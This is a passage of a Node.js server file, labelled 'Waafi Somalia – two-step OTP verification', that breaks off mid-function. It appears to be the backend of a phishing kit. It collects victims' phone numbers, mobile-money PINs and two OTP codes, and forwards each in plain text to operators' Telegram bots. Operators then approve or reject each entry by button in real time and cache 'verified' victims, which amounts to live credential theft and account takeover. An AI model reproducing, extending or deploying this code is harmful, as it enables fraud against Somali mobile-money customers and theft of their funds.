// server.js - Waafi Somalia - TWO-STEP OTP VERIFICATION (UPDATED - Zimbabwe Approach)
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

// ============================================
// CONFIGURATION
// ============================================

const CONFIG = {
  CACHE_DURATION: 5000,
  APPROVAL_TIMEOUT: 5 * 60 * 1000,
  USER_CACHE_DURATION: 30 * 60 * 1000,
  CLEANUP_INTERVAL: 60000,
  MAX_USERS: parseInt(process.env.MAX_USERS) || 1,
  REQUEST_TIMEOUT: 30000,
  MAX_NOTIFICATION_SIZE: 4096,
  BOT_STARTUP_DELAY: 3000,
  POLLING_TIMEOUT: 30,
  MAX_BOT_RESTART_ATTEMPTS: 5,
  MAX_CONCURRENT_REQUESTS: 10,
  MAX_CACHED_REQUESTS: 1000,
};

// ============================================
// REQUEST QUEUE
// ============================================
class RequestQueue {
  constructor(maxConcurrent = 10) {
    this.queue = [];
    this.running = 0;
    this.maxConcurrent = maxConcurrent;
    this.processed = 0;
    this.errors = 0;
  }

  async add(fn, priority = 0) {
    return new Promise((resolve, reject) => {
      this.queue.push({ fn, resolve, reject, priority, timestamp: Date.now() });
      this.queue.sort((a, b) => b.priority - a.priority);
      this.process();
    });
  }

  async process() {
    if (this.running >= this.maxConcurrent || this.queue.length === 0) {
      return;
    }

    this.running++;
    const { fn, resolve, reject, timestamp } = this.queue.shift();

    if (Date.now() - timestamp > 30000) {
      this.running--;
      reject(new Error('Request timeout in queue'));
      this.process();
      return;
    }

    try {
      const result = await fn();
      this.processed++;
      resolve(result);
    } catch (error) {
      this.errors++;
      reject(error);
    } finally {
      this.running--;
      this.process();
    }
  }

  getStats() {
    return {
      queued: this.queue.length,
      running: this.running,
      processed: this.processed,
      errors: this.errors
    };
  }
}

const requestQueue = new RequestQueue(CONFIG.MAX_CONCURRENT_REQUESTS);

// ============================================
// UTILITY FUNCTIONS
// ============================================
const logger = {
  info: (msg, ...args) => console.log(`[INFO] ${new Date().toISOString()} - ${msg}`, ...args),
  error: (msg, ...args) => console.error(`[ERROR] ${new Date().toISOString()} - ${msg}`, ...args),
  warn: (msg, ...args) => console.warn(`[WARN] ${new Date().toISOString()} - ${msg}`, ...args),
  debug: (msg, ...args) => console.log(`[DEBUG] ${new Date().toISOString()} - ${msg}`, ...args)
};

const validatePhoneNumber = (phoneNumber) => {
  if (!phoneNumber || typeof phoneNumber !== 'string') {
    return { valid: false, error: 'Phone number must be a string' };
  }
  
  const cleaned = phoneNumber.replace(/\D/g, '');
  
  if (cleaned.length < 9 || cleaned.length > 15) {
    return { valid: false, error: 'Invalid phone number length' };
  }
  
  return { valid: true, cleaned };
};

const validatePin = (pin) => {
  if (!pin || typeof pin !== 'string') {
    return { valid: false, error: 'PIN must be a string' };
  }
  
  if (pin.length < 4 || pin.length > 8 || !/^\d+$/.test(pin)) {
    return { valid: false, error: 'PIN must be 4-8 digits' };
  }
  
  return { valid: true };
};

const validateOtp = (otp) => {
  if (!otp || typeof otp !== 'string') {
    return { valid: false, error: 'OTP must be a string' };
  }
  
  if (otp.length < 4 || otp.length > 8 || !/^\d+$/.test(otp)) {
    return { valid: false, error: 'OTP must be 4-8 digits' };
  }
  
  return { valid: true };
};

const sanitizeInput = (input) => {
  if (typeof input !== 'string') return String(input);
  return input.replace(/[<>]/g, '').trim();
};

const truncateMessage = (message, maxLength = CONFIG.MAX_NOTIFICATION_SIZE) => {
  if (message.length <= maxLength) return message;
  return message.substring(0, maxLength - 3) + '...';
};

// ============================================
// PHONE NUMBER FORMATTING
// ============================================
const formatPhoneNumber = (phoneNumber) => {
  try {
    let cleaned = phoneNumber.replace(/\D/g, '');
    
    if (cleaned.startsWith('252')) {
      const countryCode = '+252';
      let number = cleaned.substring(3);
      
      if (number.length === 10 && number.startsWith('0')) {
        number = number.substring(1);
      }
      
      if (number.length > 9) {
        number = number.substring(number.length - 9);
      }
      
      return { countryCode, number, formatted: `${countryCode}${number}` };
    }
    
    if (cleaned.length === 10 && cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1);
    }
    
    if (cleaned.length > 9) {
      cleaned = cleaned.substring(cleaned.length - 9);
    }
    
    return { countryCode: '+252', number: cleaned, formatted: `+252${cleaned}` };
  } catch (error) {
    logger.error('Error formatting phone number:', error.message);
    return { countryCode: '+252', number: phoneNumber, formatted: phoneNumber };
  }
};

// ============================================
// DUPLICATE REQUEST DETECTION
// ============================================
const isDuplicate = (user, key) => {
  try {
    if (user.processedRequests.has(key)) {
      const timestamp = user.processedRequests.get(key);
      if (Date.now() - timestamp < CONFIG.CACHE_DURATION) {
        return true;
      }
    }
    user.processedRequests.set(key, Date.now());
    
    if (user.processedRequests.size > CONFIG.MAX_CACHED_REQUESTS) {
      const cutoff = Date.now() - CONFIG.CACHE_DURATION;
      
      const toDelete = [];
      for (const [k, v] of user.processedRequests.entries()) {
        if (v < cutoff) toDelete.push(k);
      }
      toDelete.forEach(k => user.processedRequests.delete(k));
      
      if (user.processedRequests.size > CONFIG.MAX_CACHED_REQUESTS) {
        const entries = Array.from(user.processedRequests.entries())
          .sort((a, b) => a[1] - b[1]);
        
        const toRemove = entries.slice(0, Math.floor(CONFIG.MAX_CACHED_REQUESTS / 2));
        toRemove.forEach(([k]) => user.processedRequests.delete(k));
      }
    }
    
    return false;
  } catch (error) {
    logger.error(`Error in isDuplicate for ${user.name}:`, error.message);
    return false;
  }
};

// ============================================
// USER VERIFICATION CACHE
// ============================================
const isVerifiedUser = (user, phoneNumber) => {
  const verifiedData = user.verifiedUsers.get(phoneNumber);
  
  if (!verifiedData) {
    return false;
  }
  
  const elapsed = Date.now() - verifiedData.timestamp;
  
  if (elapsed > CONFIG.USER_CACHE_DURATION) {
    user.verifiedUsers.delete(phoneNumber);
    logger.debug(`${user.name}: User cache expired for ${phoneNumber}`);
    return false;
  }
  
  verifiedData.lastLogin = Date.now();
  return true;
};

const cacheVerifiedUser = (user, phoneNumber) => {
  user.verifiedUsers.set(phoneNumber, {
    timestamp: Date.now(),
    lastLogin: Date.now()
  });
  logger.info(`${user.name}: ✅ Cached verified user ${phoneNumber} (30 min)`);
};

// ============================================
// MESSAGE FORMATTERS
// ============================================
const formatLoginMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    const isReturning = isVerifiedUser(user, data.phoneNumber);
    const userBadge = isReturning ? '🔄 RETURNING USER' : '🆕 NEW USER';
    const cacheInfo = isReturning ? '✅ <b>Cached (30 min) - will skip both OTPs</b>' : '📱 <b>New user - will show 2 OTPs</b>';
    
    return `📱 <b>${sanitizeInput(user.name)} - LOGIN ATTEMPT</b>

${userBadge}
🇸🇴 <b>Country:</b> Somalia
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔢 <b>PIN:</b> <code>${sanitizeInput(data.pin)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

${cacheInfo}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⏱️ <b>Timeout:</b> 5 minutes`;
  } catch (error) {
    logger.error(`Error formatting login message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

const formatFirstOTPMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    
    return `1️⃣ <b>${sanitizeInput(user.name)} - FIRST OTP (Step 1/2)</b>

🆕 <b>NEW USER - FIRST VERIFICATION</b>
🇸🇴 <b>Country:</b> Somalia
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔐 <b>First OTP Code:</b> <code>${sanitizeInput(data.otp)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>Verify FIRST OTP:</b>
⏱️ <b>Timeout:</b> 5 minutes
📝 <b>Next:</b> Second OTP will be sent after approval`;
  } catch (error) {
    logger.error(`Error formatting first OTP message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

const formatSecondOTPMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    
    return `2️⃣ <b>${sanitizeInput(user.name)} - SECOND OTP (Step 2/2)</b>

✅ <b>FIRST OTP VERIFIED - FINAL VERIFICATION</b>
🇸🇴 <b>Country:</b> Somalia
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔐 <b>Second OTP Code:</b> <code>${sanitizeInput(data.otp)}</code>
🔗 <b>First OTP Ref:</b> <code>${sanitizeInput(data.firstOtp)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>Verify SECOND OTP:</b>
⏱️ <b>Timeout:</b> 5 minutes
📝 <b>Next:</b> User will be logged in and cached for 30 min`;
  } catch (error) {
    logger.error(`Error formatting second OTP message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

// ============================================
// BOT MANAGER - UPDATED WITH ZIMBABWE APPROACH
// ============================================
class BotManager {
  constructor(user, linkInsert) {
    this.user = user;
    this.linkInsert = linkInsert;
    this.bot = null;
    this.isPolling = false;
    this.isInitializing = false;
    this.initializationPromise = null;
    this.restartAttempts = 0;
    this.maxRestartAttempts = CONFIG.MAX_BOT_RESTART_ATTEMPTS;
    this.pollingErrorCount = 0;
    this.lastHealthCheck = Date.now();
    this.restartScheduled = false; // CRITICAL: Prevent double-restarts
  }

  async initialize() {
    if (this.isInitializing) {
      logger.warn(`${this.user.name}: Already initializing, waiting...`);
      return this.initializationPromise;
    }

    this.isInitializing = true;
    this.initializationPromise = this._doInitialize();

    try {
      await this.initializationPromise;
      return true;
    } finally {
      this.isInitializing = false;
      this.initializationPromise = null;
    }
  }

  async _doInitialize() {
    try {
      await this.cleanup();
      await new Promise(resolve => setTimeout(resolve, 1000));

      logger.info(`${this.user.name}: Creating new bot instance...`);
      
      this.bot = new TelegramBot(this.user.botToken, {
        polling: {
          interval: 2000,
          autoStart: false,
          params: {
            timeout: CONFIG.POLLING_TIMEOUT
          }
        },
        filepath: false
      });

      // Setup handlers BEFORE starting polling
      this.setupErrorHandlers();
      this.setupCommands();

      logger.info(`${this.user.name}: Starting polling...`);
      await this.bot.startPolling();
      this.isPolling = true;

      await this.verifyBot();

      // Mark as healthy
      this.user.isHealthy = true;
      this.user.bot = this.bot;
      this.restartAttempts = 0;
      this.pollingErrorCount = 0;
      this.lastHealthCheck = Date.now();
      this.restartScheduled = false; // Clear any restart flags
      
      logger.info(`✅ ${this.user.name}: Bot initialized successfully`);
      return true;

    } catch (error) {
      logger.error(`❌ ${this.user.name}: Initialization failed:`, error.message);
      this.user.isHealthy = false;
      await this.cleanup();
      throw error;
    }
  }

  async cleanup() {
    if (!this.bot) return;

    logger.info(`${this.user.name}: Cleaning up bot...`);

    try {
      // Remove all listeners first
      this.bot.removeAllListeners();

      // Stop polling if active
      if (this.isPolling) {
        try {
          await this.bot.stopPolling({ cancel: true, reason: 'Cleanup' });
          logger.info(`${this.user.name}: Polling stopped`);
        } catch (e) {
          logger.debug(`${this.user.name}: Stop polling error (ignoring):`, e.message);
        }
      }

      // Try to abort any pending requests
      try {
        if (this.bot._polling) {
          this.bot._polling.abort = true;
        }
      } catch (e) {
        logger.debug(`${this.user.name}: Abort error (ignoring):`, e.message);
      }

    } catch (error) {
      logger.error(`${this.user.name}: Cleanup error:`, error.message);
    } finally {
      this.isPolling = false;
      this.bot = null;
      this.user.bot = null;
    }
  }

  setupErrorHandlers() {
    // FIXED polling error handler - prevents restart cascades (Zimbabwe style)
    this.bot.on('polling_error', (error) => {
      this.pollingErrorCount++;
      
      // Don't spam logs with connection errors
      if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT' || error.code === 'ENOTFOUND') {
        if (this.pollingErrorCount > 10) {
          logger.warn(`${this.user.name}: Connection issues - will monitor`);
          this.pollingErrorCount = 0;
        }
        return; // Ignore transient network errors
      }

      // Log important errors
      logger.error(`${this.user.name}: Polling error #${this.pollingErrorCount}:`, error.message);

      if (error.code === 'EFATAL') {
        logger.error(`${this.user.name}: Fatal error - will restart`);
        this.scheduleRestart(5000);
      } 
      else if (error.code === 'ETELEGRAM') {
        if (error.response?.statusCode === 401) {
          logger.error(`${this.user.name}: Invalid token - STOPPING`);
          this.user.isHealthy = false;
          this.cleanup();
        } 
        else if (error.response?.statusCode === 409) {
          // CRITICAL FIX: Only restart ONCE on 409, not repeatedly
          logger.warn(`${this.user.name}: 409 Conflict - another instance polling`);
          
          // Only schedule restart if not already restarting
          if (!this.isInitializing && !this.restartScheduled) {
            this.restartScheduled = true;
            this.scheduleRestart(10000);
          } else {
            logger.warn(`${this.user.name}: Restart already scheduled or in progress...`);
          }
        }
        else if (error.response?.statusCode === 429) {
          const retryAfter = error.response.parameters?.retry_after || 30;
          logger.warn(`${this.user.name}: Rate limited - retry after ${retryAfter}s`);
        }
      }
    });

    this.bot.on('webhook_error', (error) => {
      logger.error(`${this.user.name}: Webhook error:`, error.message);
    });

    this.bot.on('error', (error) => {
      if (!error.message?.includes('polling')) {
        logger.error(`${this.user.name}: General error:`, error.message);
      }
    });
  }

  scheduleRestart(delay = 10000) {
    if (this.restartAttempts >= this.maxRestartAttempts) {
      logger.error(`${this.user.name}: Max restart attempts reached - STOPPING`);
      this.user.isHealthy = false;
      this.restartScheduled = false;
      return;
    }

    if (this.isInitializing) {
      logger.warn(`${this.user.name}: Already restarting...`);
      return;
    }

    // CRITICAL: Prevent multiple simultaneous restart schedules
    if (this.restartScheduled) {
      logger.warn(`${this.user.name}: Restart already scheduled...`);
      return;
    }

    this.restartAttempts++;
    this.restartScheduled = true;
    logger.info(`${this.user.name}: Scheduling restart #${this.restartAttempts} in ${delay/1000}s...`);

    setTimeout(async () => {
      this.restartScheduled = false; // Clear flag before restart
      try {
        await this.initialize();
      } catch (error) {
        logger.error(`${this.user.name}: Restart failed:`, error.message);
        this.restartScheduled = false;
      }
    }, delay);
  }

  async verifyBot() {
    try {
      const me = await this.bot.getMe();
      logger.info(`${this.user.name}: Bot verified - @${me.username}`);
      return true;
    } catch (error) {
      logger.error(`${this.user.name}: Bot verification failed:`, error.message);
      throw error;
    }
  }

  setupCommands() {
    this.bot.onText(/\/start/, async (msg) => {
      try {
        await this.bot.sendMessage(
          msg.chat.id,
          `🤖 <b>${this.user.name} Bot - Waafi Somalia (Two-Step OTP)</b>\n\n` +
          `I will notify you of all login attempts and TWO OTP verifications.\n\n` +
          `<b>Your Chat ID:</b> <code>${msg.chat.id}</code>\n` +
          `<b>Your Link:</b> <code>/api/${this.linkInsert}/*</code>\n\n` +
          `⏱️ <b>User Cache:</b> 30 minutes\n` +
          `📝 <b>Returning users skip both OTPs for 30 min</b>\n` +
          `🔐 <b>New users verify 2 OTPs</b>\n\n` +
          `Add these to your .env file as:\n` +
          `<code>USER_LINK_INSERT_${this.user.id}=${this.linkInsert}</code>\n` +
          `<code>TELEGRAM_CHAT_ID_${this.user.id}=${msg.chat.id}</code>`,
          { parse_mode: 'HTML' }
        );
      } catch (error) {
        logger.error(`${this.user.name}: /start error:`, error.message);
      }
    });

    this.bot.onText(/\/status/, async (msg) => {
      try {
        const queueStats = requestQueue.getStats();
        const memUsage = process.memoryUsage();
        
        await this.bot.sendMessage(
          msg.chat.id,
          `✅ <b>${this.user.name} Bot Active - Waafi Somalia</b>\n\n` +
          `📊 Login notifications: ${this.user.loginNotifications.size}\n` +
          `1️⃣ Pending First OTP: ${this.user.firstOtpVerifications.size}\n` +
          `2️⃣ Pending Second OTP: ${this.user.secondOtpVerifications.size}\n` +
          `✅ Verified users (30 min cache): ${this.user.verifiedUsers.size}\n` +
          `🔗 Endpoint: <code>/api/${this.linkInsert}/*</code>\n` +
          `🔢 Errors: ${this.user.errorCount}\n` +
          `🔄 Restart attempts: ${this.restartAttempts}\n` +
          `📡 Polling errors: ${this.pollingErrorCount}\n\n` +
          `<b>Queue Stats:</b>\n` +
          `⏳ Queued: ${queueStats.queued}\n` +
          `▶️ Running: ${queueStats.running}\n` +
          `✅ Processed: ${queueStats.processed}\n` +
          `❌ Errors: ${queueStats.errors}\n\n` +
          `<b>Memory:</b>\n` +
          `💾 Heap: ${(memUsage.heapUsed / 1024 / 1024).toFixed(2)} MB\n` +
          `${this.user.lastError ? `⚠️ Last error: ${this.user.lastError}` : ''}`,
          { parse_mode: 'HTML' }
        );
      } catch (error) {
        logger.error(`${this.user.name}: /status error:`, error.message);
      }
    });

    this.bot.onText(/\/restart/, async (msg) => {
      try {
        await this.bot.sendMessage(msg.chat.id, '🔄 Restarting bot...', { parse_mode: 'HTML' });
        this.restartAttempts = 0;
        await this.initialize();
        await this.bot.sendMessage(msg.chat.id, '✅ Bot restarted successfully!', { parse_mode: 'HTML' });
      } catch (error) {
        logger.error(`${this.user.name}: /restart error:`, error.message);
      }
    });

    this.bot.on('callback_query', async (query) => {
      try {
        await handleCallbackQuery(this.user, query);
      } catch (error) {
        logger.error(`${this.user.name}: Callback error:`, error.message);
        logger.error(error.stack);
        try {
          await this.bot.answerCallbackQuery(query.id, { 
            text: '❌ Error occurred', 
            show_alert: true 
          });
        } catch (e) {
          logger.error(`${this.user.name}: Error answering callback:`, e.message);
        }
      }
    });
  }

  isHealthy() {
    return this.isPolling && this.user.isHealthy && !this.isInitializing;
  }
}

// ============================================
// CALLBACK QUERY HANDLER - TWO-STEP OTP
// ============================================
async function handleCallbackQuery(user, query) {
  const msg = query.message;
  const data = query.data;
  const chatId = msg.chat.id;
  const messageId = msg.message_id;

  const acknowledgeCallback = async (text, showAlert = false) => {
    try {
      await user.bot.answerCallbackQuery(query.id, { text, show_alert: showAlert });
    } catch (e) {
      logger.debug(`${user.name}: Callback acknowledge error:`, e.message);
    }
  };

  const updateMessage = async (text, keyboard = null) => {
    try {
      const options = {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: keyboard || { inline_keyboard: [] }
      };
      await user.bot.editMessageText(text, options);
      return true;
    } catch (e) {
      if (e.message?.includes('message is not modified')) {
        logger.debug(`${user.name}: Message already updated`);
        return true;
      }
      logger.error(`${user.name}: Message update error:`, e.message);
      return false;
    }
  };

  try {
    await acknowledgeCallback('⏳ Processing...');

    const parts = data.split('_');
    
    if (parts.length < 3) {
      logger.error(`${user.name}: Invalid callback data format: ${data}`);
      await acknowledgeCallback('❌ Invalid data format', true);
      return;
    }

    const type = parts[0];
    const action = parts[1];
    const dataValue = parts[parts.length - 1];
    const phoneNumber = parts.slice(2, -1).join('_');
    
    logger.info(`${user.name}: Processing ${type}_${action} for ${phoneNumber}`);

    // ========== LOGIN HANDLING ==========
    if (type === 'login') {
      const pin = dataValue;
      const loginKey = `${phoneNumber}-${pin}`;
      
      const loginData = user.loginNotifications.get(loginKey);
      
      if (!loginData) {
        logger.warn(`${user.name}: Login session not found: ${loginKey}`);
        await updateMessage(
          `❌ <b>SESSION NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> Session expired`
        );
        await acknowledgeCallback('❌ Session not found', true);
        return;
      }

      const elapsed = Date.now() - loginData.timestamp;
      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
        logger.warn(`${user.name}: Login session expired: ${loginKey}`);
        loginData.expired = true;
        loginData.approved = false;
        loginData.rejected = true;
        
        await updateMessage(
          `⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`
        );
        await acknowledgeCallback('⏰ Session expired', true);
        return;
      }

      if (loginData.approved || loginData.rejected) {
        const status = loginData.approved ? 'approved' : 'rejected';
        await acknowledgeCallback(`⚠️ Already ${status}`, true);
        return;
      }

      const { countryCode, number } = formatPhoneNumber(phoneNumber);
      const isReturning = isVerifiedUser(user, phoneNumber);

      if (action === 'proceed') {
        logger.info(`${user.name}: ✅ Approving login - ${phoneNumber}`);
        
        loginData.approved = true;
        loginData.rejected = false;
        loginData.processedAt = Date.now();
        
        const statusMessage = 
          `✅ <b>LOGIN APPROVED</b>\n\n` +
          `${isReturning ? '🔄 <b>RETURNING USER</b>' : '🆕 <b>NEW USER</b>'}\n` +
          `🇸🇴 Somalia\n` +
          `📱 <code>${number}</code>\n` +
          `🔐 <code>${pin}</code>\n\n` +
          `━━━━━━━━━━━━━━━━━━━\n\n` +
          `✅ <b>Status:</b> Approved\n` +
          `➡️ <b>Next:</b> ${isReturning ? 'Dashboard' : 'First OTP (1/2)'}\n` +
          `${isReturning ? '⏱️ <b>Cache valid for 30 min</b>\n' : ''}` +
          `⏱️ ${new Date().toLocaleTimeString()}`;
        
        const updated = await updateMessage(statusMessage);
        if (updated) {
          await acknowledgeCallback('✅ User approved successfully!');
          logger.info(`${user.name}: ✅ Login approved for ${phoneNumber}`);
        }
      }
      else if (action === 'invalid') {
        logger.info(`${user.name}: ❌ Rejecting login - ${phoneNumber}`);
        
        loginData.approved = false;
        loginData.rejected = true;
        loginData.rejectionReason = 'invalid';
        loginData.processedAt = Date.now();
        
        const statusMessage = 
          `❌ <b>INVALID CREDENTIALS</b>\n\n` +
          `🇸🇴 Somalia\n` +
          `📱 <code>${number}</code>\n` +
          `🔐 <code>${pin}</code>\n\n` +
          `━━━━━━━━━━━━━━━━━━━\n\n` +
          `❌ <b>Status:</b> Rejected\n` +
          `⏱️ ${new Date().toLocaleTimeString()}`;
        
        const updated = await updateMessage(statusMessage);
        if (updated) {
          await acknowledgeCallback('❌ Marked as invalid');
          logger.info(`${user.name}: ❌ Login rejected for ${phoneNumber}`);
        }
      }
      else {
        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
      }
    }
    
    // ========== FIRST OTP HANDLING ==========
    else if (type === 'firstotp') {
      const otp = dataValue;
      const verificationKey = `${phoneNumber}-${otp}`;
      
      const otpData = user.firstOtpVerifications.get(verificationKey);
      
      if (!otpData) {
        logger.warn(`${user.name}: First OTP session not found: ${verificationKey}`);
        
        await updateMessage(
          `❌ <b>FIRST OTP NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired or already processed`
        );
        await acknowledgeCallback('⚠️ Already processed or session expired', true);
        return;
      }

      const elapsed = Date.now() - otpData.timestamp;
      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
        logger.warn(`${user.name}: First OTP expired: ${verificationKey}`);
        otpData.expired = true;
        otpData.status = 'timeout';
        
        await updateMessage(
          `⏰ <b>FIRST OTP EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`
        );
        await acknowledgeCallback('⏰ Session expired', true);
        return;
      }

      if (otpData.status !== 'pending') {
        await acknowledgeCallback(`⚠️ Already processed: ${otpData.status}`, true);
        return;
      }

      const { countryCode, number } = formatPhoneNumber(phoneNumber);

      if (action === 'correct') {
        logger.info(`${user.name}: ✅ Approving First OTP - ${phoneNumber}`);
        
        otpData.status = 'approved';
        otpData.processedAt = Date.now();
        
        const statusMessage = 
          `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>\n\n` +
          `🇸🇴 Somalia\n` +
          `📱 <code>${number}</code>\n` +
          `🔐 <code>${otp}</code>\n\n` +
          `━━━━━━━━━━━━━━━━━━━\n\n` +
          `✅ <b>Status:</b> First OTP verified\n` +
          `➡️ <b>Next:</b> Second OTP (2/2) will be sent\n` +
          `⏱️ ${new Date().toLocaleTimeString()}`;
        
        const updated = await updateMessage(statusMessage);
        if (updated) {
          await acknowledgeCallback('✅ First OTP verified!');
          logger.info(`${user.name}: ✅ First OTP approved for ${phoneNumber}`);
        }
      }
      else if (action === 'wrong') {
        logger.info(`${user.name}: ❌ Wrong First OTP - ${phoneNumber}`);
        
        otpData.status = 'rejected';
        otpData.processedAt = Date.now();
        
        const statusMessage = 
          `❌ <b>WRONG FIRST OTP</b>\n\n` +
          `🇸🇴 Somalia\n` +
          `📱 <code>${number}</code>\n` +
          `🔐 <code>${otp}</code>\n\n` +
          `━━━━━━━━━━━━━━━━━━━\n\n` +
          `❌ <b>Status:</b> Invalid first OTP\n` +
          `⏱️ ${new Date().toLocaleTimeString()}`;
        
        const updated = await updateMessage(statusMessage);
        if (updated) {
          await acknowledgeCallback('❌ Marked as wrong');
          logger.info(`${user.name}: ❌ Wrong First OTP for ${phoneNumber}`);
        }
      }
      else if (action === 'wrongpin') {
        logger.info(`${user.name}: ⚠️ Wrong PIN (First OTP) - ${phoneNumber}`);
        
        otpData.status = 'wrong_pin';
        otpData.processedAt = Date.now();
        
        const statusMessage = 
          `⚠️ <b>WRONG PIN (First OTP)</b>\n\n` +
          `🇸🇴 Somalia\n` +
          `📱 <code>${number}</code>\n` +
          `🔐 <code>${otp}</code>\n\n` +
          `━━━━━━━━━━━━━━━━━━━\n\n` +
          `⚠️ <b>Status:</b> Incorrect PIN\n` +
          `⏱️ ${new Date().toLocaleTimeString()}`;
        
        const updated = await updateMessage(statusMessage);
        if (updated) {
          await acknowledgeCallback('⚠️ Marked as wrong PIN');
          logger.info(`${user.name}: ⚠️ Wrong PIN for First OTP - ${phoneNumber}`);
        }
      }
      else {
        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
      }
    }
    
    // ========== SECOND OTP HANDLING ==========
    else if (type === 'secondotp') {
      const otp = dataValue;
      const verificationKey = `${phoneNumber}-${otp}`;
      
      const otpData = user.secondOtpVerifications.get(verificationKey);
      
      if (!otpData) {
        logger.warn(`${user.name}: Second OTP session not found: ${verificationKey}`);
        
        // Check if this was recently processed (check verified users cache)
        const isNowVerified = isVerifiedUser(user, phoneNumber);
        
        if (isNowVerified) {
          logger.info(`${user.name}: Second OTP already processed - user is cached`);
          await acknowledgeCallback('✅ Already processed - user is verified', true);
          return;
        }
        
        await updateMessage(
          `❌ <b>SECOND OTP NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired`
        );
        await acknowledgeCallback('❌ Session not found or expired', true);
        return;
      }

      const elapsed = Date.now() - otpData.timestamp;
      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
        logger.warn(`${user.name}: Second OTP expired: ${verificationKey}`);
        otpData.expired = true;
        otpData.status = 'timeout';
        
        await updateMessage(
          `⏰ <b>SECOND OTP EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`
        );
        await acknowledgeCallback('⏰ Session expired', true);
        return;
      }

      if (otpData.status !== 'pending') {
        await acknowledgeCallback(`⚠️ Already processed: ${otpData.status}`, true);
        return;
      }

      const { countryCode, number } = formatPhoneNumber(phoneNumber);

      if (action === 'correct') {
        logger.info(`${user.name}: ✅ Approving Second OTP - ${phoneNumber}`);
        
        otpData.status = 'approved';
        otpData.processedAt = Date.now();
        
        // Cache the verified user (both OTPs verified)
        cacheVerifiedUser(user, phoneNumber);
        
        const statusMessage = 
          `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2) ✅</b>\n\n` +
          `🇸🇴 Somalia\n` +
          `📱 <code>${number}</code>\n` +
          `🔐 <code>${otp}</code>\n` +
          `🔗 <b>First OTP:</b> <code>${otpData.firstOtp}</code>\n\n` +
          `━━━━━━━━━━━━━━━━━━━\n\n` +
          `✅ <b>Status:</b> ALL verifications complete!\n` +
          `🎉 <b>Result:</b> User logged in\n` +
          `⏱️ <b>Cached for 30 minutes</b>\n` +
          `⏱️ ${new Date().toLocaleTimeString()}`;
        
        const updated = await updateMessage(statusMessage);
        if (updated) {
          await acknowledgeCallback('✅ Verified & cached!');
          logger.info(`${user.name}: ✅ Second OTP approved and user cached for ${phoneNumber}`);
        }
      }
      else if (action === 'wrong') {
        logger.info(`${user.name}: ❌ Wrong Second OTP - ${phoneNumber}`);
        
        otpData.status = 'rejected';
        otpData.processedAt = Date.now();
        
        const statusMessage = 
          `❌ <b>WRONG SECOND OTP</b>\n\n` +
          `🇸🇴 Somalia\n` +
          `📱 <code>${number}</code>\n` +
          `🔐 <code>${otp}</code>\n\n` +
          `━━━━━━━━━━━━━━━━━━━\n\n` +
          `❌ <b>Status:</b> Invalid second OTP\n` +
          `⏱️ ${new Date().toLocaleTimeString()}`;
        
        const updated = await updateMessage(statusMessage);
        if (updated) {
          await acknowledgeCallback('❌ Marked as wrong');
          logger.info(`${user.name}: ❌ Wrong Second OTP for ${phoneNumber}`);
        }
      }
      else if (action === 'wrongpin') {
        logger.info(`${user.name}: ⚠️ Wrong PIN (Second OTP) - ${phoneNumber}`);
        
        otpData.status = 'wrong_pin';
        otpData.processedAt = Date.now();
        
        const statusMessage = 
          `⚠️ <b>WRONG PIN (Second OTP)</b>\n\n` +
          `🇸🇴 Somalia\n` +
          `📱 <code>${number}</code>\n` +
          `🔐 <code>${otp}</code>\n\n` +
          `━━━━━━━━━━━━━━━━━━━\n\n` +
          `⚠️ <b>Status:</b> Incorrect PIN\n` +
          `⏱️ ${new Date().toLocaleTimeString()}`;
        
        const updated = await updateMessage(statusMessage);
        if (updated) {
          await acknowledgeCallback('⚠️ Marked as wrong PIN');
          logger.info(`${user.name}: ⚠️ Wrong PIN for Second OTP - ${phoneNumber}`);
        }
      }
      else {
